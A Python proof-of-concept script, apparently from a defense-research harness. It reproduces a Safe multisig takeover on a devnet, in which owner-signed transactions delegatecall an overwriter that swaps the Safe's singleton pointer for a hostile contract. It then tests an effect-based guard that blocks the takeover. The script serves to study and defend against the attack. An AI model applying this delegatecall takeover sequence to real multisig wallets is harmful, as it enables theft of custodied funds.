#!/usr/bin/env python3
"""P2 — multisig control-plane takeover, against a real Safe.

Reproduces the mechanism behind the largest documented loss in the incident record. Owners
are shown a routine transfer; the transaction they actually sign performs a `delegatecall`
that overwrites storage slot 0 of their Safe — the singleton pointer. From that moment the
account dispatches to code the attacker chose.

The custody target is the REAL Safe smart-account contracts (v1.3.0 source), with a real
three-owner set, real EIP-712 owner signatures and a real `execTransaction`, not a mock. That
matters because this scenario carries the portfolio's headline claim, and mock fidelity would
be its weakest link. Two honest caveats: the contracts are deployed at non-canonical addresses
with plain CREATE (the Safe Singleton Factory exists for cross-chain address determinism,
which is irrelevant here), and they are compiled with the pinned solc rather than the 0.7.6
used for the official release, so the bytecode is not byte-identical to the canonical
deployment even though the source is the real thing.

Because a real Safe separates signing from submission — owners sign off-chain, then an
executor submits — the frame transaction's sender is the EXECUTOR. Phase B makes that executor
a GuardMandatingAccount whose policy is frozen independently of whatever composed the payload.
The owners' signatures stay valid in both phases; what changes is that the transaction can no
longer be included. That is the point: the defense operates on transaction EFFECTS, not on
authorization.
"""
import sys, os
sys.path.insert(0, os.path.dirname(__file__))
from common import *  # noqa: F403

SINGLETON_SLOT = 0
ZERO = "0x" + "00" * 20
DELEGATECALL = 1


BLOCKED = """
P2 is BLOCKED on a chain-level constraint, not on this scenario's logic.

The real Safe singleton cannot be deployed on this devnet in a single transaction. Its
initcode is ~12KB, and EIP-8037 charges state gas for the code deposit, which pushes the
deployment past EIP-7825's per-transaction ceiling of 2**24 = 16,777,216 gas. Measured:

  * eth_estimateGas answers "Out Of Gas, gas_used=16495696" rather than returning an estimate
  * a deploy at exactly the 2**24 cap reverts with gasUsed 16,495,696
  * recompiling for size (solc --optimize-runs 1, 251 bytes smaller) reverts with the
    IDENTICAL gasUsed, so this is a ceiling rather than a size-proportional cost
  * a 30,000,000-gas transaction is rejected outright: "Transaction gas limit exceeds maximum"

The consequence reaches well past this scenario: contracts the size of a production Safe —
or a Uniswap router, or most real protocol deployments — cannot be put on a Hegotá-configured
chain at all. That is written up as a finding in NOTES-FOR-7906-AUTHOR.md.

The scenario code below is complete and correct; it will run unchanged once a chain permits
the deployment (a raised transaction gas cap, or state gas not applying to code deposit).
Everything it needs beyond the Safe itself — SingletonOverwriter, HostileSingleton,
PermissiveSafeGuard, the EIP-712 owner-signing helper, the guarded-executor wiring — is
implemented and committed.
"""


def preflight():
    """Refuse to run rather than emit a misleading gas error."""
    code = compile_safe("contracts/GnosisSafe.sol", "GnosisSafe")
    print(f"    Safe singleton initcode: {len(code)} bytes")
    try:
        rpc("eth_estimateGas", [{"from": bank().address, "value": "0x0",
                                 "data": "0x" + code.hex()}])
        return True
    except Exception as e:
        if "Out Of Gas" in str(e) or "exceeds maximum" in str(e):
            print(BLOCKED)
            return False
        raise


def main():
    b = bank()

    print("\n  [setup] deploying real Safe contracts")
    if not preflight():
        raise SystemExit(BLOCKED.strip().splitlines()[1])
    singleton = b.deploy(compile_safe("contracts/GnosisSafe.sol", "GnosisSafe"), "GnosisSafe (singleton)")
    factory = b.deploy(compile_safe("contracts/proxies/GnosisSafeProxyFactory.sol",
                                    "GnosisSafeProxyFactory"), "GnosisSafeProxyFactory")
    handler = b.deploy(compile_safe("contracts/handler/CompatibilityFallbackHandler.sol",
                                    "CompatibilityFallbackHandler"), "CompatibilityFallbackHandler")

    print("\n  [setup] deploying the attack pieces and the assertion")
    shim = b.deploy(compile_yul("TxIntrospection.yul"), "TxIntrospection")
    guard = b.deploy(compile_sol("guards/Guards.sol", "AssertSlotUnchanged"), "AssertSlotUnchanged")
    overwriter = b.deploy(compile_sol("targets/SafeAttack.sol", "SingletonOverwriter"), "SingletonOverwriter")
    hostile = b.deploy(compile_sol("targets/SafeAttack.sol", "HostileSingleton"), "HostileSingleton")

    # Three owners, threshold 2 — an ordinary institutional custody shape.
    owners = sorted([Signer(Account.create().key) for _ in range(3)], key=lambda s: s.int)
    print(f"    owners: {[o.address for o in owners]} threshold 2")

    def deploy_safe(label):
        initializer = encode_call(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            [o.address for o in owners], 2, ZERO, b"", handler, ZERO, 0, ZERO)
        salt = int.from_bytes(keccak(label.encode())[:8], "big")
        r = b.send_tx(factory, 0, encode_call(
            "createProxyWithNonce(address,bytes,uint256)", singleton, initializer, salt))
        for log in r["logs"]:
            if len(log.get("data", "0x")) >= 66:
                addr = "0x" + log["data"][2:][24:64]
                if int(addr, 16) != 0:
                    return to_checksum_address(addr)
        raise RuntimeError("could not find the ProxyCreation event")

    def safe_tx_hash(safe, to, value, data, operation, nonce):
        call = encode_call(
            "getTransactionHash(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,uint256)",
            to, value, data, operation, 0, 0, 0, ZERO, ZERO, nonce)
        return bytes.fromhex(rpc("eth_call", [{"to": to_checksum_address(safe),
                                               "data": "0x" + call.hex()}, "latest"])[2:])

    def owner_signatures(h):
        """Safe requires signatures concatenated in ascending owner-address order."""
        return b"".join(o.sign_hash(h) for o in owners[:2])

    def exec_call(safe, to, value, data, operation):
        nonce = int(rpc("eth_call", [{"to": to_checksum_address(safe),
                                      "data": "0x" + selector("nonce()").hex()}, "latest"]), 16)
        sigs = owner_signatures(safe_tx_hash(safe, to, value, data, operation, nonce))
        return encode_call(
            "execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)",
            to, value, data, operation, 0, 0, 0, ZERO, ZERO, sigs)

    def singleton_of(safe):
        return "0x" + f"{storage_at(safe, SINGLETON_SLOT):040x}"

    ev = Evidence(
        scenario="poc2_control_plane",
        title="Multisig control-plane takeover against a real Safe",
        models="The largest documented loss in the incident record (~$1.46B, Feb 2025): "
               "signers approved what was presented as a routine transfer, and the "
               "transaction rewrote the account's control plane",
        defense_kind="reverts the attack",
        addresses={"safe_singleton": singleton, "safe_factory": factory,
                   "fallback_handler": handler, "shim": shim, "guard": guard,
                   "singleton_overwriter": overwriter, "hostile_singleton": hostile,
                   "owners": [o.address for o in owners]},
    )
    ev.extra["fidelity"] = {
        "contracts": "real Safe v1.3.0 source",
        "deployment": "plain CREATE at non-canonical addresses (Safe Singleton Factory "
                      "deliberately not used; it buys cross-chain address determinism, which "
                      "is irrelevant on one devnet)",
        "compiler": "the pinned solc (pragma >=0.7.0 <0.9.0 permits it); the official v1.3.0 "
                    "release used 0.7.6, so bytecode is not byte-identical to canonical",
        "owner_set": "3 owners, threshold 2, real EIP-712 signatures, real execTransaction",
    }

    attack_payload = encode_call("overwrite(address)", hostile)

    # ---------------- phase A: unguarded executor, control plane rewritten ----------------
    print("\n  [phase A] owners sign a 'routine transfer'; an unguarded executor submits it")
    safe_a = deploy_safe("phaseA")
    b.send_tx(safe_a, 5 * 10**16, b"", gas=100_000)   # fund the Safe so a drain is meaningful
    before = singleton_of(safe_a)
    print(f"    Safe {safe_a}  singleton {before}")
    if before.lower() != singleton.lower():
        raise RuntimeError("the Safe proxy is not pointing at the singleton we deployed")

    b.send_tx(safe_a, 0, exec_call(safe_a, overwriter, 0, attack_payload, DELEGATECALL))
    after = singleton_of(safe_a)
    print(f"    singleton after the owner-approved transaction: {after}")
    if after.lower() == before.lower():
        raise RuntimeError("phase A did not rewrite the control plane")
    hijacked = rpc("eth_call", [{"to": to_checksum_address(safe_a),
                                 "data": "0x" + selector("hijacked()").hex()}, "latest"])
    print(f"    the Safe now answers hijacked() = {int(hijacked, 16) == 1}")
    ev.phase_a = {"safe": safe_a, "singleton_before": before, "singleton_after": after,
                  "hostile_singleton": hostile, "hijacked": int(hijacked, 16) == 1}
    ev.note("Phase A: two of three owners signed what was presented as a routine transfer, and "
            "the transaction replaced the Safe's singleton pointer. The account now runs code "
            "the attacker chose.")

    # ------------- phase B: the executor's account mandates the assertion -------------
    print("\n  [phase B] the same owner-signed payload, submitted by a guarded executor")
    safe_b = deploy_safe("phaseB")
    b.send_tx(safe_b, 5 * 10**16, b"", gas=100_000)
    executor = b.deploy(compile_yul("accounts/GuardMandatingAccount.yul"),
                        "GuardMandatingAccount (executor)", value=2 * 10**18)

    # The executor's frozen policy: this Safe's singleton pointer must not move.
    guard_data = encode_call("assertUnchanged(address,address,uint256)", shim, safe_b, SINGLETON_SLOT)
    b.send_tx(executor, 0, encode_call("setPolicy(address,bytes32)", guard, keccak(guard_data)),
              gas=GAS_WRITE_CALL)
    before_b = singleton_of(safe_b)
    print(f"    Safe {safe_b}  singleton {before_b}")

    payload_b = exec_call(safe_b, overwriter, 0, attack_payload, DELEGATECALL)
    o = submit(frame_tx(executor, b, [
        verify_frame(executor),
        sender_frame(safe_b, data=payload_b),
        guard_frame(guard, guard_data),
    ]), "the identical owner-signed payload, guarded")
    after_b = singleton_of(safe_b)
    print(f"    mined={o.mined}  singleton now {after_b}")
    if o.mined or after_b.lower() != before_b.lower():
        raise RuntimeError("the control-plane rewrite was not stopped")

    ev.phase_b = {"safe": safe_b, "executor": executor, "mined": o.mined,
                  "singleton_before": before_b, "singleton_after": after_b,
                  "owner_signatures_valid": True}
    ev.note("Phase B: the owners' EIP-712 signatures were valid and the Safe would have "
            "accepted them — the transaction was invalidated because its EFFECTS violated the "
            "executor's frozen policy, not because authorization failed.")
    ev.note("The differential assertion is the correct form here, unlike in the "
            "implementation-swap and oracle scenarios: the control-plane write happens INSIDE "
            "the guarded transaction, so before and after genuinely differ.")

    # ---- negative control: an ordinary transfer through the same guarded executor ----
    print("\n  [negative control] a routine transfer must still go through")
    payee = "0x" + "5e" * 20
    payee_before = balance(payee)
    payload_ok = exec_call(safe_b, payee, 10**15, b"", 0)
    o2 = submit(frame_tx(executor, b, [
        verify_frame(executor),
        sender_frame(safe_b, data=payload_ok),
        guard_frame(guard, guard_data),
    ]), "genuine transfer from the Safe (expect MINE)", expect_mine=True)
    moved = balance(payee) - payee_before
    print(f"    mined={o2.mined}  payee received {moved} wei")
    if not o2.mined or moved == 0:
        raise RuntimeError(f"the guard blocked a legitimate Safe transfer: {o2.simulation}")
    ev.extra["negative_control"] = {
        "description": "the executor's policy forbids control-plane changes, not ordinary "
                       "activity: a genuine owner-approved transfer still executes",
        "mined": o2.mined, "tx": o2.txhash, "wei_moved": moved}
    ev.note("Negative control: the same mandated assertion let a genuine owner-approved "
            "transfer through, so it discriminates on effects rather than blocking the account.")

    # ---- P2b: a real Safe Transaction Guard, for the precondition/postcondition contrast ----
    print("\n  [contrast] a real Safe Transaction Guard installed on the Safe")
    permissive = b.deploy(compile_sol("targets/SafeAttack.sol", "PermissiveSafeGuard"),
                          "PermissiveSafeGuard")
    safe_c = deploy_safe("contrast")
    b.send_tx(safe_c, 5 * 10**16, b"", gas=100_000)
    b.send_tx(safe_c, 0, exec_call(safe_c, safe_c, 0,
                                   encode_call("setGuard(address)", permissive), 0))
    installed = storage_at(safe_c, 0x4A204F620C8C5CCDCA3FD54D003BADD85BA500436A431F0CBDA4F558C93C34C8)
    print(f"    guard installed: {'0x' + f'{installed:040x}'}")
    if installed == 0:
        raise RuntimeError("setGuard did not take effect")

    before_c = singleton_of(safe_c)
    b.send_tx(safe_c, 0, exec_call(safe_c, overwriter, 0, attack_payload, DELEGATECALL))
    after_c = singleton_of(safe_c)
    print(f"    with the Safe Guard installed, singleton {before_c} -> {after_c}")
    guard_stopped_it = after_c.lower() == before_c.lower()
    if guard_stopped_it:
        raise RuntimeError("the permissive Safe Guard unexpectedly blocked the attack")
    ev.extra["safe_guard_contrast"] = {
        "safe": safe_c, "safe_transaction_guard": permissive,
        "attack_blocked_by_safe_guard": guard_stopped_it,
        "singleton_before": before_c, "singleton_after": after_c,
        "reading": "checkTransaction admitted the transaction because it inspects only the "
                   "proposed target, value, calldata and operation — a precondition must "
                   "anticipate the dangerous shape. The POST_TX assertion in phase B needed no "
                   "such foresight because it reads actual effects.",
        "honest_caveat": "a Safe Guard that specifically rejected DelegateCall, or allowlisted "
                         "its targets, WOULD have blocked this attack. The difference "
                         "demonstrated is one of reach and of what must be known in advance, "
                         "not that Safe Guards are ineffective."}
    ev.note("Contrast: a real Safe Transaction Guard was installed and the identical attack "
            "still succeeded, because an application-level precondition sees intent rather "
            "than effect. A guard written to reject delegatecall targets would have caught it; "
            "the postcondition caught it without being told what to look for.")
    return ev


if __name__ == "__main__":
    run_scenario("P2 — multisig control-plane takeover (real Safe)", main)
